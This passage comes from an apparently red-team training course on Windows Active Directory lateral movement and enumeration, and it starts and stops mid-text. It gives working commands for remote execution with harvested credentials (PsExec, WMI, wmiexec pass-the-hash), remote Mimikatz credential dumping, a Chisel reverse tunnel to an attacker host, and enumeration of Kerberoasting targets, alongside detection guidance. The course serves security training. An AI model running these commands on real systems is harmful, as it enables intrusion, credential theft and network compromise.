ability to make outbound connections\n$potentialTargets = @(&quot;192.168.1.10&quot;, &quot;192.168.1.11&quot;, &quot;ServerA.domain.local&quot;) # Example list\nforeach ($target in $potentialTargets) {\n    try {\n        $socket = New-Object System.Net.Sockets.TcpClient($target, 3389)\n        Write-Host &quot;$target has RDP port 3389 open&quot;\n        $socket.Close()\n    } catch {\n        # Port is likely closed or host is down\n    }\n}\n\n# Similarly, check for SMB (445), WinRM (5985/5986), RPC (135)\n</code></pre>\n<h5><strong>4.2 Leveraging Harvested Credentials for Lateral Movement</strong></h5>\n<p>This is the engine that drives most lateral movement within a Windows domain. The credentials you harvested in Module 2 (or will harvest later) are gold.</p>\n<ul>\n<li><p><strong>Types of Credentials:</strong></p>\n<ul>\n<li><strong>Plaintext Passwords:</strong> The most valuable. Can be used for any authentication method.</li>\n<li><strong>NTLM Hashes:</strong> Can be used directly for authentication via techniques like Pass-the-Hash (PtH) against services using NTLM authentication (like SMB).</li>\n<li><strong>Kerberos Tickets:</strong> Can be reused or forged via techniques like Pass-the-Ticket (PtT) or Overpass-the-Hash (OpH).</li>\n<li><strong>Cached Credentials:</strong> Stored by the OS.</li>\n<li><strong>Saved Credentials:</strong> Stored in Credential Manager or configuration files.</li>\n</ul>\n</li>\n<li><p><strong>How they enable LM:</strong> Many remote administration tools and protocols (PsExec, WMI, RDP, PowerShell Remoting, SMB) support authentication using usernames/passwords or hashes/tickets. If you have valid credentials for an account that has permissions on a target machine, you can use these tools to authenticate and execute code or access resources remotely.</p>\n</li>\n<li><p><strong>Note:</strong> We will have a <em>deep dive</em> into the specifics of NTLM, Kerberos, Pass-the-Hash, Pass-the-Ticket, and Overpass-the-Hash in <strong>Module 6</strong>. For now, understand that having a user&#39;s password or hash <em>allows</em> you to use the techniques described below to authenticate to other machines <em>as that user</em>.</p>\n</li>\n</ul>\n<h5><strong>4.3 Lateral Movement using Native Windows Tools</strong></h5>\n<p>These techniques leverage built-in Windows features and protocols. They are powerful because they often don&#39;t require uploading custom binaries (though helper scripts or tools are common), can sometimes blend in with normal network traffic, and rely on functionality that is often enabled by default for legitimate administration.</p>\n<p>Let&#39;s break down the most common and effective ones:</p>\n<h6><strong>4.3.1 PsExec and its Variants</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> PsExec (part of Sysinternals, now Microsoft) allows you to execute processes on other systems. It&#39;s widely used by administrators, making its traffic potentially less suspicious than custom malware.</p>\n</li>\n<li><p><strong>How it Works:</strong> PsExec typically works by installing a temporary Windows Service (<code>PSEXESVC</code>) on the target machine. This service then executes the command you specify and sends the output back. It authenticates using the credentials of the user running PsExec or explicitly provided credentials.</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Simple to use.</li>\n<li>Requires no client-side installation on the target (except the temporary service).</li>\n<li>Effective for executing commands or launching shells remotely.</li>\n<li>Commonly used by IT, potentially blending in.</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Requires administrative privileges on the target machine.</li>\n<li>Creates a service (<code>PSEXESVC</code>), which is a common detection artifact.</li>\n<li>Can be blocked by endpoint security solutions.</li>\n<li>Relies on SMB (ports 139/445) and RPC (port 135).</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li><strong>Using current user&#39;s credentials (if admin on target):</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip_or_hostname&gt; &lt;command_to_execute&gt;\n# Example: Execute cmd.exe on Server01\nPsExec.exe \\\\Server01 cmd.exe\n# This will open an interactive command shell on Server01\n</code></pre>\n</li>\n<li><strong>Using explicit credentials:</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip_or_hostname&gt; -u &lt;domain&gt;\\&lt;username&gt; -p &lt;password&gt; &lt;command_to_execute&gt;\n# Example: Execute whoami as domain\\administrator on 192.168.1.20\nPsExec.exe \\\\192.168.1.20 -u domain\\administrator -p &#39;MySecretPwd123!&#39; whoami\n</code></pre>\n</li>\n<li><strong>Running as SYSTEM:</strong> The <code>-s</code> flag runs the process in the SYSTEM account&#39;s security context. The <code>-h</code> flag (Windows Vista and later) runs the process with the account&#39;s elevated token, often bypassing UAC prompts on the target if the user is in the Administrators group.<pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip&gt; -s cmd.exe\nPsExec.exe \\\\&lt;target_ip&gt; -h cmd.exe\n</code></pre>\n</li>\n<li><strong>Executing a program with arguments:</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip&gt; -u &lt;user&gt; -p &lt;pass&gt; &quot;C:\\Path\\To\\Program.exe&quot; arg1 arg2\n</code></pre>\n</li>\n<li><strong>Copying a file and executing it:</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip&gt; -c &lt;local_file_to_copy&gt; &lt;command_to_execute_copied_file&gt;\n# Example: Copy evil.exe and run it\nPsExec.exe \\\\192.168.1.20 -u domain\\user -p pass -c evil.exe evil.exe\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Detection:</strong> Look for <code>PSEXESVC</code> service creation and deletion events (Event ID 7036 in System log), remote process creation events (Event ID 4688 with <code>PSEXESVC</code> as parent, or Sysmon Event ID 1), and network traffic patterns indicative of SMB/RPC service installation and command execution.</p>\n</li>\n</ul>\n<h6><strong>4.3.2 Windows Management Instrumentation (WMI)</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> WMI is a powerful interface for managing Windows systems, both locally and remotely. It allows querying system information, executing methods (including creating processes), and receiving event notifications.</p>\n</li>\n<li><p><strong>How it Works:</strong> WMI uses DCOM (Distributed Component Object Model) over RPC (port 135) initially, then negotiates ports for the actual data transfer. It can also operate over WinRM (ports 5985/5986). It authenticates using standard Windows methods (NTLM/Kerberos).</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Native to Windows.</li>\n<li>Extremely flexible for both enumeration and execution.</li>\n<li>Often allowed by firewalls for management purposes.</li>\n<li>Less noisy than PsExec&#39;s service creation (though remote process creation is still detectable).</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Syntax can be complex (<code>wmic</code>, WMI Query Language - WQL).</li>\n<li>Requires administrative privileges on the target for most offensive actions (like process creation).</li>\n<li>Firewall rules might restrict DCOM/RPC traffic.</li>\n</ul>\n</li>\n<li><p><strong>Usage (PowerShell):</strong></p>\n<ul>\n<li><strong>Executing a command/process:</strong><pre><code class=\"language-powershell\"># Using Invoke-WmiMethod (newer PowerShell)\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c ipconfig &gt; C:\\temp\\ipconfig_target.txt&quot; -ComputerName &lt;target_ip_or_hostname&gt; -Credential (Get-Credential) # Prompts for credentials\n# Or pass credentials directly (less secure in scripts, better for interactive)\n$pass = ConvertTo-SecureString &#39;MySecretPwd123!&#39; -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential &#39;domain\\user&#39;, $pass\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c whoami &gt; C:\\temp\\whoami_target.txt&quot; -ComputerName &lt;target_ip&gt; -Credential $cred\n\n# Using Get-WmiObject (older PowerShell)\n(Get-WmiObject win32_process -computername &lt;target_ip&gt; -credential $cred).create(&quot;cmd /c calc.exe&quot;)\n</code></pre>\n</li>\n<li><strong>Enumeration (useful for recon from a distance):</strong><pre><code class=\"language-powershell\">Get-WmiObject -Class Win32_OperatingSystem -ComputerName &lt;target_ip&gt; -Credential $cred\nGet-WmiObject -Class Win32_Service -ComputerName &lt;target_ip&gt; -Credential $cred | Where-Object {$_.StartMode -eq &#39;Auto&#39;}\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Usage (wmic command - from CMD):</strong></p>\n<ul>\n<li><strong>Executing a process:</strong><pre><code class=\"language-cmd\">wmic /node:&lt;target_ip&gt; /user:&quot;&lt;domain&gt;\\&lt;user&gt;&quot; /password:&quot;&lt;password&gt;&quot; process call create &quot;cmd.exe /c whoami &gt; C:\\temp\\whoami_target_wmic.txt&quot;\n</code></pre>\n</li>\n<li><strong>Enumeration:</strong><pre><code class=\"language-cmd\">wmic /node:&lt;target_ip&gt; /user:&quot;&lt;domain&gt;\\&lt;user&gt;&quot; /password:&quot;&lt;password&gt;&quot; os get Caption,CSDVersion,OSArchitecture /format:list\nwmic /node:&lt;target_ip&gt; /user:&quot;&lt;domain&gt;\\&lt;user&gt;&quot; /password:&quot;&lt;password&gt;&quot; service get Name,State /format:list\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Usage (Impacket&#39;s <code>wmiexec.py</code>):</strong> A popular Python tool for WMI execution, often used from Linux/Kali.</p>\n<pre><code class=\"language-bash\"># Using password\nwmiexec.py &lt;domain&gt;/&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;target_ip&gt; &#39;whoami&#39;\n# Using NTLM hash (requires hash obtained previously)\nwmiexec.py &lt;domain&gt;/&lt;user&gt;@&lt;target_ip&gt; -hashes :&lt;ntlm_hash&gt; &#39;ipconfig&#39;\n</code></pre>\n</li>\n<li><p><strong>Detection:</strong> Look for remote WMI activity (often logged on the target, Sysmon Event ID 21 for WMI event consumers, Event ID 4624/4625 for remote logins, remote process creation Event ID 4688/Sysmon ID 1 initiated by WMI processes like <code>WmiPrvse.exe</code>).</p>\n</li>\n</ul>\n<h6><strong>4.3.3 Remote Desktop Protocol (RDP)</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> RDP provides a graphical interface to a remote machine. If RDP is enabled and you have credentials for a user allowed to log in via RDP (typically users in the Remote Desktop Users group or Administrators), you can establish a full interactive session.</p>\n</li>\n<li><p><strong>How it Works:</strong> RDP uses port 3389 (default) and establishes a direct graphical session. Authentication uses standard Windows methods.</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Full interactive access.</li>\n<li>Easy to navigate and use the target system.</li>\n<li>Commonly used by administrators.</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Requires RDP service to be enabled on the target.</li>\n<li>Requires credentials for a user permitted to RDP.</li>\n<li>Creates an interactive logon session, which is highly visible in logs (Event ID 4624 Logon Type 10).</li>\n<li>Firewalls might block port 3389.</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li><strong>Native RDP Client (mstsc.exe):</strong><pre><code class=\"language-cmd\">mstsc /v:&lt;target_ip_or_hostname&gt;\n# You will be prompted for credentials.\n# To pre-fill username (password still prompted):\nmstsc /v:&lt;target_ip&gt; /u:&lt;domain&gt;\\&lt;user&gt;\n</code></pre>\n</li>\n<li><strong>Using saved RDP credentials:</strong> If the user on your current host has saved RDP credentials for the target, <code>mstsc</code> might use them automatically.</li>\n<li><strong>Tools that automate RDP login:</strong> Some C2 frameworks or specialized tools can automate RDP logins using harvested credentials.</li>\n</ul>\n</li>\n<li><p><strong>Detection:</strong> Look for interactive logon events (Event ID 4624 Logon Type 10) on the target machine, RDP session connect/disconnect events, and network traffic on port 3389.</p>\n</li>\n</ul>\n<h6><strong>4.3.4 PowerShell Remoting (PSRemoting)</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> PSRemoting allows executing PowerShell commands and scripts on remote computers. It&#39;s the preferred method for remote administration in modern Windows environments.</p>\n</li>\n<li><p><strong>How it Works:</strong> PSRemoting uses the WS-Management protocol (WinRM listener) typically over HTTP (port 5985) or HTTPS (port 5986). It uses standard Windows authentication. It needs to be enabled on the target machine (<code>Enable-PSRemoting</code>).</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Powerful and flexible for complex tasks and scripting.</li>\n<li>Native to PowerShell, integrates well with other cmdlets.</li>\n<li>Can be more firewall-friendly than DCOM/RPC depending on configuration.</li>\n<li>Often enabled in modern server environments.</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Requires PSRemoting to be enabled on the target.</li>\n<li>Requires credentials for a user with remote execution rights (often Administrators).</li>\n<li>Firewalls might block ports 5985/5986.</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li><strong>Entering an interactive session:</strong><pre><code class=\"language-powershell\">Enter-PSSession -ComputerName &lt;target_ip_or_hostname&gt; -Credential (Get-Credential) # Prompts\n# Using explicit credentials:\n$pass = ConvertTo-SecureString &#39;MySecretPwd123!&#39; -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential &#39;domain\\user&#39;, $pass\nEnter-PSSession -ComputerName &lt;target_ip&gt; -Credential $cred\n# Once inside the session, the prompt changes, e.g., [target_ip]: PS&gt;\n# You can run PowerShell commands directly on the target. Type &#39;Exit-PSSession&#39; to leave.\n</code></pre>\n</li>\n<li><strong>Running a single command or script block:</strong><pre><code class=\"language-powershell\">Invoke-Command -ComputerName &lt;target_ip&gt; -ScriptBlock { &lt;command_to_execute&gt; } -Credential $cred\n# Example:\nInvoke-Command -ComputerName 192.168.1.20 -ScriptBlock { Get-Process explorer } -Credential $cred\nInvoke-Command -ComputerName 192.168.1.20 -ScriptBlock { ipconfig /all &gt; C:\\temp\\ipconfig_psremoting.txt } -Credential $cred\n</code></pre>\n</li>\n<li><strong>Using PowerShell scripts/modules remotely:</strong> Many post-exploitation frameworks and scripts (like PowerSploit&#39;s <code>PowerView</code> or <code>Invoke-Mimikatz</code>) are designed to be run via <code>Invoke-Command</code> or within a remote session.<pre><code class=\"language-powershell\"># Example: Run Invoke-Mimikatz remotely (assuming it&#39;s loaded in the remote session or dot-sourced)\nInvoke-Command -ComputerName 192.168.1.20 -ScriptBlock { Invoke-Mimikatz -Command &#39;&quot;sekurlsa::logonpasswords&quot;&#39; } -Credential $cred\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Detection:</strong> Look for WinRM activity (Event ID 4624/4625 for network logins, Event ID 4100/4104 for PowerShell script block logging, Event ID 4688/Sysmon ID 1 for remote process creation initiated via WinRM, network traffic on ports 5985/5986).</p>\n</li>\n</ul>\n<h5><strong>4.4 Session Reuse and Leveraging Existing Authenticated Sessions</strong></h5>\n<ul>\n<li><p><strong>Concept:</strong> Sometimes, you don&#39;t need to explicitly provide credentials for a lateral move. If the user you are currently acting as on the compromised host already has an authenticated session or cached credentials that are valid on the target machine, you might be able to leverage that existing context.</p>\n</li>\n<li><p><strong>How it Works:</strong> When a user authenticates to a domain resource (like a file share, a web server, etc.), the Windows LSA (Local Security Authority) caches credentials or obtains Kerberos tickets. Subsequent attempts to access <em>other</em> resources <em>as the same user</em> might automatically use these cached credentials or tickets without prompting for a password again.</p>\n</li>\n<li><p><strong>Practical Application:</strong></p>\n<ul>\n<li>If you compromise a machine where a Domain Admin is currently logged in, you might be able to use tools that operate in the context of the <em>logged-in user&#39;s</em> session to access other resources they have permissions for.</li>\n<li>Tools like <code>runas /netonly</code> can simulate logging in as a different user specifically for network resource access <em>without</em> changing the current user on the local machine. This is useful if you have credentials but don&#39;t want to PE on the current machine yet or can&#39;t inject into a process.<pre><code class=\"language-cmd\"># Example: Run cmd.exe as domain\\admin, but only for network access\nrunas /netonly /user:domain\\admin cmd.exe\n# A new CMD window opens. Inside this window, try accessing a share only admin can access:\n# net use \\\\&lt;target_ip&gt;\\C$\n# dir \\\\&lt;target_ip&gt;\\C$\n</code></pre>\n</li>\n<li>Leveraging Kerberos ticket caches (covered more in M6 with Pass-the-Ticket). If you can extract a user&#39;s TGT (Ticket Granting Ticket), you can inject it into a session on <em>another</em> machine and potentially access resources as that user.</li>\n</ul>\n</li>\n<li><p><strong>OpSec Note:</strong> Using <code>runas /netonly</code> or similar techniques might still generate logon events on the target resource, but the logon type might be different (e.g., Network cleartext, Logon Type 3) compared to an interactive RDP logon (Logon Type 10).</p>\n</li>\n</ul>\n<h5><strong>4.5 Pivoting and Tunneling</strong></h5>\n<ul>\n<li><p><strong>Concept:</strong> Pivoting (or relaying) and tunneling are techniques used to route network traffic through a compromised host to reach other systems or networks that are not directly accessible from the attacker&#39;s machine.</p>\n</li>\n<li><p><strong>How it Works:</strong></p>\n<ul>\n<li><strong>Pivoting:</strong> The compromised host acts as a relay. Attack traffic is sent to the compromised host, which then forwards it to the intended target deeper in the network. Tools like Metasploit&#39;s <code>autoroute</code> or <code>socks4a</code> modules, or frameworks like Covenant, have built-in pivoting capabilities.</li>\n<li><strong>Tunneling:</strong> Creates a secure channel (like an SSH tunnel, or tunnels created by tools like Chisel, Earthworm, etc.) through the compromised host. Traffic is encapsulated and sent through this tunnel. This can be used to access specific ports or even entire networks.</li>\n</ul>\n</li>\n<li><p><strong>Why use it?</strong></p>\n<ul>\n<li>To bypass network segmentation and firewalls.</li>\n<li>To access systems on isolated subnets.</li>\n<li>To obscure the true origin of the attack traffic.</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li>This is often integrated into C2 frameworks.</li>\n<li>Manual methods involve setting up port forwards or SOCKS proxies on the compromised host.</li>\n<li><strong>Example (using Chisel):</strong><ul>\n<li>Run Chisel server on attacker machine: <code>chisel server -p 8000 --socks5</code></li>\n<li>Upload Chisel client to compromised host.</li>\n<li>Run Chisel client on compromised host: <code>chisel client &lt;attacker_ip&gt;:8000 R:socks5</code></li>\n<li>Now, configure tools on attacker machine to use a SOCKS5 proxy pointing to <code>localhost:1080</code> (or whatever the client forwarded), and their traffic will be routed through the compromised host.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Note:</strong> Full network pivoting and tunneling is a complex topic often covered in more advanced modules or specialized courses. For the scope of this course on AD red teaming, understand the <em>concept</em> that if a target isn&#39;t directly reachable, a compromised host <em>within</em> that network can act as a stepping stone. We will focus primarily on the <em>techniques for execution once you <em>can</em> reach the target host</em> using credentials.</p>\n</li>\n</ul>\n<h5><strong>4.6 OpSec Considerations for Lateral Movement</strong></h5>\n<p>Lateral movement is inherently noisy compared to initial reconnaissance on a single host. You are interacting with multiple systems across the network, generating logs and network traffic.</p>\n<ul>\n<li><strong>What Defenders See:</strong><ul>\n<li><strong>Authentication Logs:</strong> Successful and failed login attempts on target machines (Event ID 4624/4625). Logon Type 3 (Network) is common for PsExec, WMI, SMB access. Logon Type 10 (RemoteInteractive) for RDP.</li>\n<li><strong>Process Creation Logs:</strong> Remote execution techniques like PsExec, WMI, and PSRemoting result in new processes being created on the target machine (Event ID 4688, Sysmon Event ID 1). Look for unusual parent-child relationships (e.g., <code>wmiprvse.exe</code> or <code>PSEXESVC.exe</code> launching <code>cmd.exe</code> or <code>powershell.exe</code>).</li>\n<li><strong>Service Creation Logs:</strong> PsExec creates the <code>PSEXESVC</code> service (Event ID 7036).</li>\n<li><strong>Network Traffic:</strong> Specific ports being accessed (135, 139, 44</li>\n</ul>\n</li>\n</ul>\n\n                </div>\n             </div>\n         ",
    "module-5": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 5: module_5</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve spent the last few modules getting cozy on a single Windows host, digging through its secrets, and figuring out how to become its local king or queen. But let&#39;s be real – the real treasure in most corporate environments isn&#39;t just on one machine; it&#39;s spread across the domain. And the keys to the kingdom? They usually reside in Active Directory.</p>\n<p>This is where the game changes. We&#39;re moving from a single-player scenario to understanding the entire network ecosystem. Module 5 is all about becoming master cartographers of the Active Directory forest, mapping out the paths that lead to the most valuable targets. This isn&#39;t just about running a few commands; it&#39;s about building a comprehensive picture of the domain&#39;s structure, users, groups, computers, and critically, the <em>relationships</em> between them.</p>\n<p>Think of AD enumeration as gathering intelligence, and attack path mapping as turning that intelligence into a strategic plan. Without this step, you&#39;re just blindly poking around. With it, you&#39;re efficiently identifying the weakest links and the most direct routes to your objectives.</p>\n<p>Let&#39;s dive in and learn how to see the forest <em>and</em> the trees!</p>\n<hr>\n<h2><strong>Module 5: Active Directory Enumeration &amp; Attack Path Mapping</strong></h2>\n<p><strong>Module Objective:</strong> Conduct comprehensive reconnaissance of an Active Directory environment to identify users, groups, computers, trusts, GPOs, and map potential attack paths to high-value targets like Domain Admins. By the end of this module, you&#39;ll be able to use native tools, PowerShell, and BloodHound to understand the structure and relationships within an AD domain and identify promising attack vectors.</p>\n<p><strong>Target State:</strong> From a compromised domain-joined host (simulating initial access from previous modules), you can enumerate key AD objects and their relationships, load this data into a graph database tool, and query it to find potential attack paths towards sensitive targets.</p>\n<hr>\n<h3><strong>5.1 Introduction to Active Directory Concepts (Refresher)</strong></h3>\n<p>Before we start poking around, let&#39;s quickly ground ourselves in the fundamentals. Even if you&#39;ve worked with AD before, a red teamer&#39;s perspective is slightly different – we care about how these components create potential security weaknesses.</p>\n<ul>\n<li><strong>Domain Controller (DC):</strong> The heart of the domain. Holds the Active Directory database (NTDS.DIT), authenticates users, enforces security policies. Compromising a DC often means domain dominance.</li>\n<li><strong>Forest:</strong> A collection of one or more domains that share a common schema, configuration, and global catalog. Domains within a forest trust each other transitively by default.</li>\n<li><strong>Trusts:</strong> Relationships between domains or forests that allow users in one domain to access resources in another. Can be transitive (flows through) or non-transitive, one-way or two-way. A trust is a potential lateral movement path <em>across</em> domain boundaries.</li>\n<li><strong>Organizational Units (OUs):</strong> Containers within a domain used to organize users, groups, computers, and other OUs. OUs are key for applying Group Policy.</li>\n<li><strong>Group Policy Objects (GPOs):</strong> Collections of settings that control the working environment of user and computer accounts. Applied to Sites, Domains, or OUs. GPOs are powerful for enforcing security, but misconfigured GPOs (e.g., containing credentials, applying insecure settings) can be a major weakness.</li>\n<li><strong>Users &amp; Groups:</strong> The principals and collections of principals within the domain. We&#39;re particularly interested in privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, etc.) and users who are members of these groups, or users with specific attributes that make them vulnerable (e.g., SPNs, weak passwords, &#39;Do not require Kerberos preauthentication&#39;).</li>\n<li><strong>Computers:</strong> Workstations and servers joined to the domain. Computers also have accounts in AD. Their local group memberships (especially local Administrators) and authenticated sessions are critical for lateral movement.</li>\n</ul>\n<p><strong>Red Team Focus:</strong> We&#39;re looking for <em>relationships</em> and <em>misconfigurations</em>. Who is a local admin on which machine? Which users are in which privileged groups? Which computers have which users logged in? Which GPOs apply where and contain what? Where do trusts exist? These connections form the graph we want to exploit.</p>\n<hr>\n<h3><strong>5.2 Native Command-Line Tools for AD Enumeration</strong></h3>\n<p>Why start with native tools? Because they are <em>always</em> there on a Windows machine (unless heavily crippled), they don&#39;t require bringing external executables (potentially triggering AV/EDR), and they are often less suspicious than powerful PowerShell scripts or dedicated tools if used carefully. They can be slow and noisy for large domains, but they are fundamental.</p>\n<p>Make sure you execute these commands from a domain-joined machine, ideally with credentials that have at least standard domain user privileges.</p>\n<p><strong>Essential Native Commands:</strong></p>\n<ol>\n<li><p><strong>Identifying the Domain and Domain Controller:</strong></p>\n<ul>\n<li><code>systeminfo | findstr /B /C:&quot;Domain:&quot; /C:&quot;Logon Server:&quot;</code><ul>\n<li>Finds the joined domain and the DC used for login.</li>\n</ul>\n</li>\n<li><code>ipconfig /all | findstr &quot;Primary Dns Suffix&quot;</code><ul>\n<li>Another way to find the domain name.</li>\n</ul>\n</li>\n<li><code>nltest /domain_trusts</code><ul>\n<li>Lists domain trusts (if any) for the current domain. Requires elevated privileges sometimes.</li>\n</ul>\n</li>\n<li><code>nltest /dclist:&lt;DomainName&gt;</code><ul>\n<li>Lists domain controllers for a specific domain.</li>\n<li><em>Example:</em> <code>nltest /dclist:corp.local</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating Domain Users:</strong></p>\n<ul>\n<li><code>net user /domain</code><ul>\n<li>Lists all user accounts in the domain. Basic, but effective.</li>\n</ul>\n</li>\n<li><code>dsquery user -limit 0</code><ul>\n<li>More flexible. <code>-limit 0</code> means no limit (get all users).</li>\n<li><em>Example:</em> <code>dsquery user -limit 0 | more</code> (pipe to <code>more</code> if list is long)</li>\n</ul>\n</li>\n<li><code>dsquery user -name &quot;Admin*&quot;</code><ul>\n<li>Finds users whose name starts with &quot;Admin&quot;.</li>\n</ul>\n</li>\n<li><code>dsget user &lt;UserDN&gt; -display -memberof</code><ul>\n<li>Gets details about a specific user and their group memberships. You&#39;d need the Distinguished Name (DN) from <code>dsquery</code>.</li>\n<li><em>Example:</em> <code>dsquery user -samid &quot;johndoe&quot; | dsget user -display -memberof</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating Domain Groups:</strong></p>\n<ul>\n<li><code>net group /domain</code><ul>\n<li>Lists all global and domain local groups in the domain.</li>\n</ul>\n</li>\n<li><code>net group &quot;&lt;GroupName&gt;&quot; /domain</code><ul>\n<li>Lists members of a specific domain group. Very useful for finding members of privileged groups.</li>\n<li><em>Example:</em> <code>net group &quot;Domain Admins&quot; /domain</code></li>\n<li><em>Example:</em> <code>net group &quot;Enterprise Admins&quot; /domain</code></li>\n<li><em>Example:</em> <code>net group &quot;Administrators&quot; /domain</code> (This lists members of the <em>built-in</em> Administrators group in the domain, often containing Domain Admins)</li>\n</ul>\n</li>\n<li><code>dsquery group -limit 0</code><ul>\n<li>Lists all groups in the domain. More options for filtering than <code>net group</code>.</li>\n</ul>\n</li>\n<li><code>dsget group &lt;GroupDN&gt; -members</code><ul>\n<li>Lists members of a group using its DN.</li>\n<li><em>Example:</em> <code>dsquery group -name &quot;Domain Admins&quot; | dsget group -members</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating Domain Computers:</strong></p>\n<ul>\n<li><code>net view /domain:&lt;DomainName&gt;</code><ul>\n<li>Lists computers (servers and workstations) visible in the domain.</li>\n<li><em>Example:</em> <code>net view /domain:corp.local</code></li>\n</ul>\n</li>\n<li><code>dsquery computer -limit 0</code><ul>\n<li>Lists all computer accounts in the domain.</li>\n<li><em>Example:</em> <code>dsquery computer -limit 0</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Enumerating OUs:</strong></p>\n<ul>\n<li><code>dsquery ou -limit 0</code><ul>\n<li>Lists all Organizational Units. Useful for understanding the domain&#39;s structure.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><strong>Pros of Native Tools:</strong></p>\n<ul>\n<li>Always available.</li>\n<li>Low risk of detection <em>by signature</em> (though command line logging can catch them).</li>\n<li>Good for quick checks if you know exactly what you&#39;re looking for.</li>\n</ul>\n<p><strong>Cons of Native Tools:</strong></p>\n<ul>\n<li>Limited functionality compared to PowerShell or dedicated tools.</li>\n<li>Output is often messy and difficult to parse programmatically.</li>\n<li>Can be very slow for large domains.</li>\n<li>Often requires specific syntax and DNs (<code>dsquery</code>/<code>dsget</code>).</li>\n</ul>\n<hr>\n<h3><strong>5.3 Advanced AD Enumeration with PowerShell</strong></h3>\n<p>PowerShell is your best friend for AD reconnaissance. It&#39;s flexible, powerful, and its output is structured, making it easy to filter, sort, and export data. The <code>ActiveDirectory</code> module (part of the Remote Server Administration Tools - RSAT) provides cmdlets specifically designed for interacting with AD. Even without RSAT installed, modules like <code>PowerView</code> can often perform similar actions by directly interacting with the LDAP protocol.</p>\n<p><strong>Using the <code>ActiveDirectory</code> Module:</strong></p>\n<p>If RSAT is installed (often on administrative workstations or servers), you can import the module:</p>\n<pre><code class=\"language-powershell\">Import-Module ActiveDirectory\n</code></pre>\n<p>Now you have access to cmdlets like <code>Get-ADUser</code>, <code>Get-ADGroup</code>, <code>Get-ADComputer</code>, <code>Get-ADDomain</code>, <code>Get-ADForest</code>, <code>Get-ADOrganizationalUnit</code>, <code>Get-ADServicePrincipalName</code>, etc.</p>\n<p><strong>Examples with <code>ActiveDirectory</code> Module:</strong></p>\n<pre><code class=\"language-powershell\"># Get information about the domain\nGet-ADDomain\n\n# Get information about the forest\nGet-ADForest\n\n# List all users (first 10 for brevity, remove -ResultSetSize for all)\nGet-ADUser -Filter * -Properties SamAccountName -ResultSetSize 10 | Select-Object SamAccountName\n\n# Get details for a specific user\nGet-ADUser -Identity &quot;johndoe&quot; -Properties * # Use -Properties * to get all attributes\n\n# List all groups\nGet-ADGroup -Filter * | Select-Object Name\n\n# Get members of the &quot;Domain Admins&quot; group\nGet-ADGroupMember -Identity &quot;Domain Admins&quot;\n\n# List all computers\nGet-ADComputer -Filter * | Select-Object Name, OperatingSystem\n\n# Find computers where a specific user is a local administrator (requires checking local groups, more complex with just this module)\n# This requires iterating or using other techniques, PowerView simplifies this!\n\n# Find users whose password hasn&#39;t expired (potential service accounts)\nGet-ADUser -Filter &#39;PasswordExpired -eq $false&#39; -Properties SamAccountName, PasswordNeverExpires\n\n# Find users with &#39;Do not require Kerberos preauthentication&#39; enabled (AS-REP Roasting target)\nGet-ADUser -Filter &#39;UserAccountControl -band 0x400000&#39; -Properties SamAccountName, UserPrincipalName\n\n# Find Service Principal Names (SPNs) - Kerberoasting targets\nGet-ADServicePrincipalName -Filter *\n# Or more specifically, users/computers with SPNs\nGet-ADUser -Filter &#39;ServicePrincipalNames -like &quot;*&quot;&#39; -Properties SamAccountName, ServicePrincipalNames\nGet-ADComputer -Filter &#39;ServicePrincipalNames -like &quot;*&quot;&#39; -Properties Name, ServicePrincipalNames\n</code></pre>\n<p><strong>Using <code>PowerView</code> (from PowerSploit/Deviance):</strong></p>\n<p><code>PowerView</code> is a PowerShell script designed specifically for AD reconnaissance from an offensive perspective. It&#39;s often preferred because it consolidates many useful functions and can sometimes bypass execution restrictions more easily than importing a formal module.</p>\n<p>First, you need to get the <code>PowerView.ps1</code> script. You can often find it in red teaming frameworks (like Covenant, Empire, or standalone on GitHub).</p>\n<pre><code class=\"language-powershell\"># Assuming you&#39;ve downloaded PowerView.ps1 to the current directory\nImport-Module 